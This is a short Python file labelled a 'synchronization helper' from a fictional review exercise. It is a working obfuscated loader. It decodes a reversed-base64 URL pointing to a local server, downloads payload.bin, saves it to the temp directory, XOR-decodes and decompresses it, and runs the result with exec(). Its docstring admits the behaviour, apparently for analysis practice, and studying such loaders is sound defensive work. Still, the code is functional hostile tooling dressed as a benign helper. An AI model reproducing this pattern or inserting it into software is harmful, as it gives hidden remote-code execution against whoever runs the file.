"""A synchronization helper recovered during a fictional review.

Treat as untrusted: this example intentionally downloads data and uses exec().
The _q decoder is independent of the download/execute entrypoint.
"""

import base64 as _a
from pathlib import Path as _p
import tempfile as _t
from urllib.request import urlopen as _o
import zlib as _z

_h = "==gbpJmLkF2bslXYw9yc0V2czF2L2cDO4oTMuAjLw4yNyEzLvoDc0RHa"
_v = (0x43, 0x21, 0x79, 0x2e, 0x59, 0x13, 0x73)


def _r():
    return _a.b64decode(_h[::-1]).decode("ascii")


def _q(data):
    """Return recovered source bytes without evaluating them."""
    if not data.startswith(b"LAB1"):
        raise ValueError("Unrecognized review cache format")
    body = data[4:]
    plain = bytes(c ^ _v[i % len(_v)] for i, c in enumerate(body))
    return _z.decompress(plain)


def _w():
    with _o(_r(), timeout=4) as response:
        content = response.read(65536)
    if not content or len(content) >= 65536:
        raise ValueError("Unexpected cache size")

    destination = _p(_t.gettempdir()) / "payload.bin"
    destination.write_bytes(content)

    # Intentionally questionable behavior for this analysis exercise:
    recovered = _q(content).decode("utf-8")
    exec(compile(recovered, "<recovered-review>", "exec"),
         {"__name__": "__main__"})


if __name__ == "__main__":
    _w()
